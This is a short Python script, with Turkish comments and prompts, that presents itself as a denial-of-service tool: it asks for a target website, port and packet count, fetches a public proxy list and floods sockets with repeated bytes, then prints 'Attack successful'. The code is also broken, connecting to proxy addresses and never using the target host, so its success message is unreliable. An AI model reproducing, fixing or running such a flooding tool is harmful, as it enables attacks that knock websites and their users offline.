import socket
import time
import requests

def send_packets(host, port, packet_count, proxy_list):
    for proxy in proxy_list:
        # Socket oluştur
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Proxy kullanmak için bağlantı yap
        s.settimeout(10)
        s.connect((proxy, port))
        
        # Paketleri gönder
        data = b'PAKET'* packet_count
        s.sendall(data)
        
        # Bağlantıyı kapat
        s.close()

host = input("Hedef website adresi: ")
port = int(input("Hedef port numarası: "))
packet_count = int(input("Gönderilecek paket sayısı: "))

# Proxy listesini al
proxy_list = []
try:
    response = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http")
    proxy_list = response.text.split('\r\n')
except:
    print("Proxy listesi alınamadı")

send_packets(host, port, packet_count, proxy_list)
print("Saldırı başarılı")
